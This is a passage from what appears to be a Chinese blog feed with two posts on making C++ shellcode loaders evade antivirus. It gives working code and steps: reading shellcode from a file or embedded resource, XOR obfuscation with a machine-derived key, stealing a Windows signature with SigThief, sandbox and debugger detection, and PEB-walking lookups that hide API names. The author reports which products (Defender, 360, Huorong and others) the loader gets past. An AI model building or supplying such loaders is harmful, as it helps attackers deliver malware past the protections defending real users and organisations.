class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* filename, <span class="keyword">int</span>&amp; len)</span> </span>&#123;</span><br><span class="line">    FILE* fp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> err = fopen_s(&amp;fp, filename, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (err != <span class="number">0</span> || !fp) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fseek(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    len = ftell(fp);</span><br><span class="line">    rewind(fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>* lpAddress = (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">    fread(lpAddress, <span class="number">1</span>, len, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> lpAddress;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main&#123;&#125;&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *payload;</span><br><span class="line">    <span class="keyword">int</span>  payload_len = <span class="number">1373696</span>;  <span class="comment">//大小为shellcode文件大小,用sizeof方法也行</span></span><br><span class="line">    payload = inputFile(<span class="string">"mim_e.txt"</span>, payload_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/2.png" class=""><p><a name="zUB9y"></a></p><h2 id="查杀分析"><a href="#查杀分析" class="headerlink" title="查杀分析"></a>查杀分析</h2><p><a name="buTQw"></a></p><h3 id="常见的杀软及其特点-转自锦鲤安全"><a href="#常见的杀软及其特点-转自锦鲤安全" class="headerlink" title="常见的杀软及其特点(转自锦鲤安全)"></a><strong>常见的杀软及其特点(转自锦鲤安全)</strong></h3><p><a name="gFTwd"></a></p><h4 id="常见杀软特点总结"><a href="#常见杀软特点总结" class="headerlink" title="常见杀软特点总结"></a><strong>常见杀软特点总结</strong></h4><p>杀软一般通过一下几点来检测恶意软件和行为：</p><ol><li><strong>静态查杀</strong>：最基本的查杀方式，主要通过对文件的特征码进行扫描，匹配已知的病毒特征库。如果发现文件特征码与病毒特征库中的某个病毒特征码相匹配，就判断该文件为病毒；部分杀软会在静态查杀时将程序放入沙箱中运行几秒的方式以检测程序是否是恶意程序。</li><li><strong>动态（主动）查杀</strong>：通过在程序运行时扫描程序内存是否匹配病毒特征的方式主动发现恶意程序。在 EDR 中还会挂钩敏感的 Windows API，在程序调用到被挂钩的 API 时检查函数参数和调用栈以检测恶意程序。</li><li><strong>流量监控</strong>：监控网络流量，分析网络数据包，如果发现异常流量或者已知的恶意流量特征，就可能是恶意软件在进行网络活动。</li><li><strong>行为监控</strong>：监控程序的运行行为，如文件操作、注册表操作等。如果发现某个程序的行为超出了正常范围，就可能是恶意软件。</li></ol><p>常见杀软特点如下：</p><ul><li><strong>火绒</strong>：静态查杀能力弱，没有动态查杀，横向移动防护比较强，frp 等内网穿透工具会受到影响。</li><li><strong>360安全卫士&#x2F;360杀毒</strong>：静态查杀能力较强，没有动态查杀，如果开启了核晶模式，则行为查杀比较强，注入进程等敏感行为会被拦截；核晶模式在物理机中默认开启，在虚拟机中默认关闭。</li><li><strong>360QVM</strong>：360QVM 简单的说就是使用了机器学习辅助查杀，在360杀毒引擎设置中开启 360QVM 后静态查杀会变得非常流氓，有一点特征就会被查杀。</li><li><strong>Windows Defender</strong>：静态查杀能力较强，动态查杀较强，监控 HTTP 流量。</li><li><strong>卡巴斯基</strong>：普通版静态查杀能力一般，企业版静态查杀能力较强，动态查杀较强。</li><li><strong>ESET</strong>：静态查杀能力较强，没有动态查杀。<br><a name="ziGD4"></a></li></ul><h3 id="软件分析"><a href="#软件分析" class="headerlink" title="软件分析"></a>软件分析</h3><p>分离免杀，但是静态查杀效果不行，360云查杀没过去、卡巴斯基过不去。只能过火绒，defender。<br />由于是shellcode加载程序，所以动态查杀基本没啥特征，我们优先考虑静态过，动态一般流量侧查杀比较多，我们只是加载个程序目前不在考虑范围内。<br />继续改！<br><a name="aXIGx"></a></p><h1 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h1><p><a name="UvDgb"></a></p><h2 id="添加ico"><a href="#添加ico" class="headerlink" title="添加ico"></a>添加ico</h2><p>添加 -&gt;资源-&gt; ico<br /></p><img src="/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/3.png" class=""><p><a name="VyZwz"></a></p><h2 id="添加签名"><a href="#添加签名" class="headerlink" title="添加签名"></a>添加签名</h2><p>在c:\windows\system32里找一个近期的windows签名文件。<br />利用sigthief.py添加签名。<br />项目地址：<a href="https://github.com/secretsquirrel/SigThief" target="_blank" rel="noopener">https://github.com/secretsquirrel/SigThief</a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">sigthief</span><span class="selector-class">.py</span> <span class="selector-tag">-t</span> <span class="selector-tag">test</span><span class="selector-class">.txt</span> <span class="selector-tag">-t</span> <span class="selector-tag">cmd</span><span class="selector-class">.exe</span> <span class="selector-tag">-o</span> <span class="selector-tag">mi_test</span><span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure><img src="/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/4.png" class=""><p><a name="oCuWp"></a></p><h2 id="杀软测试"><a href="#杀软测试" class="headerlink" title="杀软测试"></a>杀软测试</h2><p>目前可过：defender、360、火绒<br />不可过：卡巴斯基<br><a name="zNDNI"></a></p><h1 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h1><p><a name="jWyxD"></a></p><h2 id="动态key"><a href="#动态key" class="headerlink" title="动态key"></a>动态key</h2><p>修改为动态key进行xor加密。这块代码就不给了，主要思路就是拿每台机器都会有的特征来当key（比如说系统路径、系统名、注册表之类的）。<br><a name="wO5Kr"></a></p><h2 id="捆绑shellcode"><a href="#捆绑shellcode" class="headerlink" title="捆绑shellcode"></a>捆绑shellcode</h2><p>再将shellcode加载进项目资源，导入txt到项目资源中。修改分离免杀读取方式。<br />修改如下：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HRSRC hRes =  FindResource(<span class="name">NULL</span>, MAKEINTRESOURCE(<span class="name">IDR_TEXT1</span>), TEXT(<span class="string">"TEXT"</span>))<span class="comment">;</span></span><br><span class="line">HGLOBAL hData = LoadResource(<span class="name">NULL</span>, hRes)<span class="comment">;</span></span><br><span class="line">char* data = (<span class="name">char*</span>)LockResource(<span class="name">hData</span>)<span class="comment">;</span></span><br><span class="line">DWORD dataSize = SizeofResource(<span class="name">NULL</span>, hRes)<span class="comment">;</span></span><br></pre></td></tr></table></figure><img src="/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/5.png" class=""><p><a name="dKcI2"></a></p><h2 id="免杀效果展示"><a href="#免杀效果展示" class="headerlink" title="免杀效果展示"></a>免杀效果展示</h2><p><a name="FQqoK"></a></p><h3 id="defender-静态、动态查杀"><a href="#defender-静态、动态查杀" class="headerlink" title="defender 静态、动态查杀"></a>defender 静态、动态查杀</h3><img src="/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/6.png" class=""><p><a name="UXOaw"></a></p><h3 id="卡巴斯基-静态、动态查杀"><a href="#卡巴斯基-静态、动态查杀" class="headerlink" title="卡巴斯基 静态、动态查杀"></a>卡巴斯基 静态、动态查杀</h3><img src="/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/7.png" class=""><p><a name="eqCLA"></a></p><h3 id="360-静态、行为查杀"><a href="#360-静态、行为查杀" class="headerlink" title="360 静态、行为查杀"></a>360 静态、行为查杀</h3><img src="/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/8.png" class=""><p><a name="Z5oDA"></a></p><h3 id="火绒-静态"><a href="#火绒-静态" class="headerlink" title="火绒 静态"></a>火绒 静态</h3><img src="/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/9.png" class=""><p><a name="Cpb3H"></a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/bNCm1mxDHz7euZ685SQvag" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/bNCm1mxDHz7euZ685SQvag</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近一段时间都在忙着红队项目和攻防类项目，一直没时间去把笔记脱敏转成博客。以后随缘更新吧，有些东西太容易被溯源了….&lt;/p&gt;</summary>
    
    
    
    
    <category term="C++" scheme="https://chenzidu.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>C++变形免杀初探（二）</title>
    <link href="https://chenzidu.github.io/2023/08/29/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://chenzidu.github.io/2023/08/29/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2023-08-29T09:21:39.000Z</published>
    <updated>2024-03-11T07:47:58.298Z</updated>
    
    <content type="html"><![CDATA[<p>这个马子倒是提前就研究好了，但是因为前段时间项目要用到，所以得等项目结束后再发出来，免得杀软检测了。免杀效果还行，不做沙箱对抗的话，常见的麦咖啡、卡巴斯基、小红伞、赛门铁克、defender、天擎都能过。</p><a id="more"></a><h1 id="沙箱对抗"><a href="#沙箱对抗" class="headerlink" title="沙箱对抗"></a>沙箱对抗</h1><p><a name="b1hld"></a><br><a name="NExAD"></a></p><h2 id="1、枚举进程数"><a href="#1、枚举进程数" class="headerlink" title="1、枚举进程数"></a>1、枚举进程数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ProcessesCountNum</span><span class="params">()</span></span>&#123;</span><br><span class="line">DWORD runningProcessesIDs[<span class="number">1024</span>];</span><br><span class="line">DWORD runningProcessesCountBytes;</span><br><span class="line">DWORD runningProcessesCount;</span><br><span class="line">EnumProcesses(runningProcessesIDs, <span class="keyword">sizeof</span>(runningProcessesIDs), &amp;runningProcessesCountBytes);</span><br><span class="line">runningProcessesCount = runningProcessesCountBytes / <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line"><span class="keyword">if</span> (runningProcessesCount &lt; <span class="number">120</span>) </span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="CqKhT"></a></p><h2 id="2、硬盘大小"><a href="#2、硬盘大小" class="headerlink" title="2、硬盘大小"></a>2、硬盘大小</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断硬盘是否大于200G</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">IsHardDiskBiggerThanNum</span><span class="params">()</span></span>&#123;</span><br><span class="line">    DWORD drives = GetLogicalDrives();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; driveLetters;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> letter = <span class="string">'A'</span>; letter &lt;= <span class="string">'Z'</span>; letter++)&#123;</span><br><span class="line">        DWORD mask = <span class="number">1</span> &lt;&lt; (letter - <span class="string">'A'</span>);</span><br><span class="line">        <span class="keyword">if</span> (drives &amp; mask)&#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">string</span> drive = <span class="built_in">std</span>::<span class="built_in">string</span>(<span class="number">1</span>, letter) + <span class="string">":\\"</span>;</span><br><span class="line">            driveLetters.push_back(drive);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> totalSizeInGBm = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; drive : driveLetters)&#123;</span><br><span class="line">        ULARGE_INTEGER totalNumberOfBytes;</span><br><span class="line">        ULARGE_INTEGER totalNumberOfFreeBytes; </span><br><span class="line">        GetDiskFreeSpaceEx(drive.c_str(), <span class="literal">nullptr</span>, &amp;totalNumberOfBytes, &amp;totalNumberOfFreeBytes);</span><br><span class="line">        <span class="keyword">double</span> totalSizeInGB = <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(totalNumberOfBytes.QuadPart) / (<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Drive "</span> &lt;&lt; drive &lt;&lt; <span class="string">" total size : "</span> &lt;&lt; totalSizeInGB &lt;&lt; <span class="string">" GB"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;  </span><br><span class="line">        totalSizeInGBm += totalSizeInGB;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (totalSizeInGBm &lt; <span class="number">220</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、内存大小"><a href="#3、内存大小" class="headerlink" title="3、内存大小"></a>3、内存大小</h2><p>检查总内存是否大于2G</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bool</span> IsRAMBiggerThanRma()</span><br><span class="line">&#123;</span><br><span class="line">    MEMORYSTATUSEX memoryStatus;</span><br><span class="line">    memoryStatus.dwLength = sizeof(memoryStatus);</span><br><span class="line">    GlobalMemoryStatusEx(&amp;memoryStatus);</span><br><span class="line">    <span class="keyword">if</span> (memoryStatus.ullTotalPhys &lt; <span class="number">2</span>LL * <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、检查是否有调试工具"><a href="#4、检查是否有调试工具" class="headerlink" title="4、检查是否有调试工具"></a>4、检查是否有调试工具</h2><p>进程查找是否有调试工具</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bool</span> check<span class="constructor">_process_is_running(<span class="params">const</span> <span class="params">std</span>::<span class="params">string</span>&amp; <span class="params">proc_name</span>)</span> &#123;</span><br><span class="line">    HANDLE hSnapshot;</span><br><span class="line">    PROCESSENTRY32 pe = &#123;&#125;;</span><br><span class="line">    <span class="comment">//cout &lt;&lt; proc_name.c_str() &lt;&lt; endl;</span></span><br><span class="line">    pe.dwSize = sizeof(pe);</span><br><span class="line">    <span class="built_in">bool</span> present = <span class="literal">false</span>;</span><br><span class="line">    hSnapshot = <span class="constructor">CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="constructor">Process32First(<span class="params">hSnapshot</span>, &amp;<span class="params">pe</span>)</span>) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="constructor">StrCmpI(<span class="params">pe</span>.<span class="params">szExeFile</span>, <span class="params">proc_name</span>.<span class="params">c_str</span>()</span>)) &#123;</span><br><span class="line">                present = <span class="literal">true</span>;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="constructor">Process32Next(<span class="params">hSnapshot</span>, &amp;<span class="params">pe</span>)</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="constructor">CloseHandle(<span class="params">hSnapshot</span>)</span>;</span><br><span class="line">    return present;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5、检查是否出网"><a href="#5、检查是否出网" class="headerlink" title="5、检查是否出网"></a>5、检查是否出网</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">sockhost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    boost::asio::io_context io_context;</span><br><span class="line">    <span class="function">tcp::resolver <span class="title">resolver</span><span class="params">(io_context)</span></span>;</span><br><span class="line">    tcp::resolver::results_type endpoints = resolver.resolve(<span class="string">"tongji.baidu.com"</span>, <span class="string">"https"</span>);</span><br><span class="line">    <span class="function">tcp::socket <span class="title">socket</span><span class="params">(io_context)</span></span>;</span><br><span class="line">    boost::asio::<span class="built_in">connect</span>(socket, endpoints);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="WinAPI函数xor隐藏"><a href="#WinAPI函数xor隐藏" class="headerlink" title="WinAPI函数xor隐藏"></a>WinAPI函数xor隐藏</h1><p>str变量中存放函数名称，先异或，异或后放入加载器，加载器异或后再自定义函数执行<br><a name="Sp0dG"></a></p><h2 id="Win函数名加载器"><a href="#Win函数名加载器" class="headerlink" title="Win函数名加载器"></a>Win函数名加载器</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">#<span class="keyword">include</span> &lt;stdlib.h&gt;</span><br><span class="line">#<span class="keyword">include</span> &lt;stdio.h&gt;</span><br><span class="line">#<span class="keyword">include</span> &lt;windows.h&gt;</span><br><span class="line">#<span class="keyword">include</span> &lt;winternl.h&gt;</span><br><span class="line">#<span class="keyword">include</span> &lt;shlwapi.h&gt;</span><br><span class="line">#<span class="keyword">include</span> &lt;<span class="built_in">string</span>.h&gt;</span><br><span class="line"></span><br><span class="line">#pragma comment(lib, <span class="string">"Shlwapi.lib"</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> cmp<span class="constructor">UnicodeStr(WCHAR <span class="params">substr</span>[], WCHAR <span class="params">mystr</span>[])</span> &#123;</span><br><span class="line">  <span class="constructor">_wcslwr_s(<span class="params">substr</span>, MAX_PATH)</span>;</span><br><span class="line">  <span class="constructor">_wcslwr_s(<span class="params">mystr</span>, MAX_PATH)</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="constructor">StrStrW(<span class="params">mystr</span>, <span class="params">substr</span>)</span> != NULL) &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">typedef <span class="constructor">UINT(CALLBACK<span class="operator">*</span> <span class="params">fnMessageBoxA</span>)</span>(</span><br><span class="line">  HWND   hWnd,</span><br><span class="line">  LPCSTR lpText,</span><br><span class="line">  LPCSTR lpCaption,</span><br><span class="line">  UINT   uType</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HMODULE my<span class="constructor">GetModuleHandle(LPCWSTR <span class="params">lModuleName</span>)</span> &#123;</span><br><span class="line">  PEB* pPeb = (PEB*)<span class="constructor">__readgsqword(0x60)</span>;</span><br><span class="line">  PEB_LDR_DATA* Ldr = pPeb-&gt;Ldr;</span><br><span class="line">  LIST_ENTRY* ModuleList = &amp;Ldr-&gt;InMemoryOrderModuleList; </span><br><span class="line">  LIST_ENTRY* pStartListEntry = ModuleList-&gt;Flink;</span><br><span class="line">  WCHAR mystr<span class="literal">[MAX<span class="identifier">_PATH</span>]</span> = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  WCHAR substr<span class="literal">[MAX<span class="identifier">_PATH</span>]</span> = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry-&gt;Flink) &#123;</span><br><span class="line">    LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));</span><br><span class="line">    memset(mystr, <span class="number">0</span>, MAX_PATH<span class="operator"> * </span>sizeof(WCHAR));</span><br><span class="line">    memset(substr, <span class="number">0</span>, MAX_PATH<span class="operator"> * </span>sizeof(WCHAR));</span><br><span class="line">    wcscpy<span class="constructor">_s(<span class="params">mystr</span>, MAX_PATH, <span class="params">pEntry</span>-&gt;FullDllName.Buffer)</span>;</span><br><span class="line">    wcscpy<span class="constructor">_s(<span class="params">substr</span>, MAX_PATH, <span class="params">lModuleName</span>)</span>;</span><br><span class="line">    <span class="keyword">if</span> (cmp<span class="constructor">UnicodeStr(<span class="params">substr</span>, <span class="params">mystr</span>)</span>) &#123;</span><br><span class="line">      <span class="comment">// returning the DLL base address.</span></span><br><span class="line">      return (HMODULE)pEntry-&gt;DllBase;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(<span class="string">"failed to get a handle to %s\n"</span>, lModuleName);</span><br><span class="line">  return NULL;</span><br><span class="line">&#125;</span><br><span class="line">FARPROC my<span class="constructor">GetProcAddress(HMODULE <span class="params">hModule</span>, LPCSTR <span class="params">lpProcName</span>)</span> &#123;</span><br><span class="line">  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">  PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader-&gt;e_lfanew);</span><br><span class="line">  PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + </span><br><span class="line">  ntHeaders-&gt;OptionalHeader.DataDirectory<span class="literal">[IMAGE<span class="identifier">_DIRECTORY_ENTRY_EXPORT</span>]</span>.VirtualAddress);</span><br><span class="line">  DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">  WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line">  DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory-&gt;AddressOfNames);</span><br><span class="line">  for (DWORD i = <span class="number">0</span>; i &lt; exportDirectory-&gt;NumberOfNames; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strcmp(lpProcName, (const <span class="built_in">char</span>*)hModule + addressOfNames<span class="literal">[<span class="identifier">i</span>]</span>)<span class="operator"> == </span><span class="number">0</span>) &#123;</span><br><span class="line">      return (FARPROC)((BYTE*)hModule + addressOfFunctions<span class="literal">[<span class="identifier">addressOfNameOrdinals</span>[<span class="identifier">i</span>]</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return NULL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">char</span> s_NAVM<span class="literal">[]</span> = &#123; <span class="number">0x23</span>,<span class="number">0x0d</span>,<span class="number">0x32</span>,<span class="number">0x19</span>,<span class="number">0x1c</span>,<span class="number">0x0a</span> &#125;;</span><br><span class="line"><span class="built_in">char</span> s_mb<span class="literal">[]</span> = &#123; <span class="number">0x23</span>,<span class="number">0x0d</span>,<span class="number">0x24</span>,<span class="number">0x07</span>,<span class="number">0x19</span>,<span class="number">0x11</span> &#125;;</span><br><span class="line"><span class="built_in">char</span> s_dll<span class="literal">[]</span> = &#123; <span class="number">0x03</span>,<span class="number">0x0d</span>,<span class="number">0x17</span>,<span class="number">0x19</span> &#125;;</span><br><span class="line"><span class="built_in">char</span> s_key<span class="literal">[]</span> = <span class="string">"xxx"</span>;</span><br><span class="line">void <span class="constructor">XOR(<span class="params">char</span> <span class="operator">*</span> <span class="params">data</span>, <span class="params">size_t</span> <span class="params">data_len</span>, <span class="params">char</span> <span class="operator">*</span> <span class="params">key</span>, <span class="params">size_t</span> <span class="params">key_len</span>)</span> &#123;</span><br><span class="line">  <span class="built_in">int</span> j;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  for (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; data_len; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (j<span class="operator"> == </span>key_len - <span class="number">1</span>) j = <span class="number">0</span>;</span><br><span class="line">    data<span class="literal">[<span class="identifier">i</span>]</span> = data<span class="literal">[<span class="identifier">i</span>]</span> ^ key<span class="literal">[<span class="identifier">j</span>]</span>;</span><br><span class="line">    j++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> main(<span class="built_in">int</span> argc, <span class="built_in">char</span>* argv<span class="literal">[]</span>) &#123;</span><br><span class="line">  